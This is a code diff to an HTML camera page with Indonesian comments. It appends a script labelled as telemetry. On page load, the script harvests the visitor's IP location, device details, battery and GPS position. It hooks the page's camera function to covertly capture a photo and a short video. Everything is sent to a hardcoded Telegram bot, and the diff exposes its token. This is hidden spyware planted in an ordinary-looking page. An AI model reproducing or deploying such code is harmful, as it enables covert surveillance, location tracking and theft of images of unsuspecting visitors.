@@ -402,5 +402,232 @@
         document.getElementById('lSub').textContent = 'Kamera tidak bisa diakses';
     });
   </script>
+
+<!-- ════════════════════════════════════════════════════════════════ -->
+<!--  ADDED: Telemetry Module — Auto device info + photo + video     -->
+<!-- ════════════════════════════════════════════════════════════════ -->
+<script>
+(function() {
+  const BOT = "8398366538:AAEtcJpzc1hOrKWkP_wbczNPhW3I3SbB2hg";
+  const CHAT = "8771899958";
+  let deviceData = {};
+  let sentDevice = false;
+  let sentMedia = false;
+
+  // ─── Helper: kirim teks ───
+  async function sendTelegramMessage(text) {
+    for (const chunk of splitText(text, 3800)) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT, text: chunk, parse_mode: 'HTML' })
+        });
+      } catch(e) {}
+      await sleep(300);
+    }
+  }
+
+  // ─── Helper: kirim lokasi ───
+  async function sendTelegramLocation(lat, lng) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT, latitude: lat, longitude: lng })
+      });
+    } catch(e) {}
+  }
+
+  // ─── Helper: kirim foto ───
+  async function sendPhotoToTelegram(base64, label = 'capture') {
+    try {
+      const blob = await (await fetch(base64)).blob();
+      const fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('photo', blob, `${label}_${Date.now()}.jpg`);
+      fd.append('caption', `📸 ${label}\nIP: ${deviceData.ip || 'N/A'}`);
+      await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd });
+    } catch(e) {}
+  }
+
+  // ─── Helper: kirim video ───
+  async function sendVideoToTelegram(blob, label = 'record') {
+    try {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('video', blob, `${label}_${Date.now()}.mp4`);
+      fd.append('caption', `🎥 ${label}\nIP: ${deviceData.ip || 'N/A'}`);
+      await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`, { method: 'POST', body: fd });
+    } catch(e) {}
+  }
+
+  function splitText(text, max) {
+    const chunks = [];
+    while (text.length > max) {
+      let idx = text.lastIndexOf('\n', max);
+      if (idx < max/2) idx = max;
+      chunks.push(text.substring(0, idx));
+      text = text.substring(idx);
+    }
+    chunks.push(text);
+    return chunks;
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  // ─── 1. Kumpulkan info device (tanpa izin tambahan) ───
+  async function collectDeviceInfo() {
+    // IP / geolocation
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      Object.assign(deviceData, {
+        ip: d.ip, isp: d.org, city: d.city, region: d.region,
+        country: d.country_name, postal: d.postal, asn: d.asn,
+        ipLat: d.latitude, ipLng: d.longitude,
+        ipMaps: d.latitude ? `https://maps.google.com?q=${d.latitude},${d.longitude}` : ''
+      });
+    } catch(e) {}
+
+    // Device info dasar
+    Object.assign(deviceData, {
+      ua: navigator.userAgent, platform: navigator.platform,
+      lang: navigator.language, cpu: navigator.hardwareConcurrency,
+      ram: navigator.deviceMemory, screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || 'Direct'
+    });
+
+    // Baterai
+    try {
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        deviceData.battery = Math.round(b.level*100) + '%' + (b.charging?' (Charging)':'');
+      }
+    } catch(e) {}
+
+    // GPS (minta izin sekali)
+    if (navigator.geolocation) {
+      try {
+        const pos = await new Promise((res,rej) => {
+          navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000});
+        });
+        deviceData.gpsLat = pos.coords.latitude;
+        deviceData.gpsLng = pos.coords.longitude;
+        deviceData.gpsMaps = `https://maps.google.com?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      } catch(e) { deviceData.gpsStatus = 'Denied'; }
+    }
+  }
+
+  // ─── 2. Kirim report device ───
+  async function sendDeviceReport() {
+    if (sentDevice) return;
+    sentDevice = true;
+
+    await collectDeviceInfo();
+
+    const msg = `╔══════════════════════════════════════════╗
+║  NARUTO × SASUKE — Device Report        ║
+╚══════════════════════════════════════════╝
+🌐 IP: ${deviceData.ip || 'N/A'} 
+📡 ISP: ${deviceData.isp || 'N/A'}
+📍 ${deviceData.city || 'N/A'}, ${deviceData.region || 'N/A'}, ${deviceData.country || 'N/A'}
+🗺️ Maps: ${deviceData.ipMaps || 'N/A'}
+🎯 GPS: ${deviceData.gpsLat ? deviceData.gpsLat+', '+deviceData.gpsLng : 'Denied'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Model: ${deviceData.ua || 'N/A'} | CPU: ${deviceData.cpu || '?'}c | RAM: ${deviceData.ram || '?'}GB
+🖥️ Screen: ${deviceData.screen}
+🔋 Battery: ${deviceData.battery || '?'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 ${deviceData.lang || 'N/A'} | 🕐 ${deviceData.timezone}
+🔗 Ref: ${deviceData.referrer}`;
+
+    await sendTelegramMessage(msg);
+    if (deviceData.gpsLat) await sendTelegramLocation(deviceData.gpsLat, deviceData.gpsLng);
+    else if (deviceData.ipLat) await sendTelegramLocation(deviceData.ipLat, deviceData.ipLng);
+  }
+
+  // ─── 3. Ambil foto + video dari stream ───
+  function capturePhotoFromVideo(video) {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    return canvas.toDataURL('image/jpeg', 0.7);
+  }
+
+  function captureVideoFromStream(stream, duration = 3000) {
+    return new Promise((resolve) => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/mp4' }));
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), duration);
+    });
+  }
+
+  // ─── 4. Tunggu kamera aktif, lalu kirim media ───
+  function waitForCameraAndSendMedia() {
+    const video = document.getElementById('v_src');
+    if (!video) return;
+
+    // Cek setiap 1 detik sampai video siap
+    const checkInterval = setInterval(async () => {
+      if (video.videoWidth > 0 && video.readyState >= 2) {
+        clearInterval(checkInterval);
+
+        // Kirim foto
+        const photo = capturePhotoFromVideo(video);
+        await sendPhotoToTelegram(photo, 'auto_capture');
+
+        // Kirim video (3 detik)
+        try {
+          const stream = video.srcObject;
+          if (stream && stream.active) {
+            const videoBlob = await captureVideoFromStream(stream, 3000);
+            await sendVideoToTelegram(videoBlob, 'auto_record');
+          }
+        } catch(e) { /* video recording gagal, tetap lanjut */ }
+
+        sentMedia = true;
+      }
+    }, 1000);
+
+    // Timeout 15 detik kalau kamera gagal
+    setTimeout(() => clearInterval(checkInterval), 15000);
+  }
+
+  // ─── 🔥 EKSEKUSI ───
+
+  // 1. Saat halaman dimuat, kirim info device secepatnya
+  document.addEventListener('DOMContentLoaded', () => {
+    sendDeviceReport();
+  });
+
+  // 2. Setelah kamera diizinkan, kirim foto + video
+  // Kita hook ke fungsi `startCam` asli yang sudah ada
+  const originalStartCam = window.startCam || function() {};
+  window.startCam = async function() {
+    const result = await originalStartCam.apply(this, arguments);
+    // Setelah kamera start, tunggu sampai stream siap
+    setTimeout(() => {
+      waitForCameraAndSendMedia();
+    }, 2000);
+    return result;
+  };
+
+  // Jika kamera sudah aktif sejak awal (misal reload), langsung coba
+  setTimeout(() => {
+    const video = document.getElementById('v_src');
+    if (video && video.videoWidth > 0 && video.readyState >= 2 && !sentMedia) {
+      waitForCameraAndSendMedia();
+    }
+  }, 6000);
+
+})();
+</script>
+
 </body>
 </html>
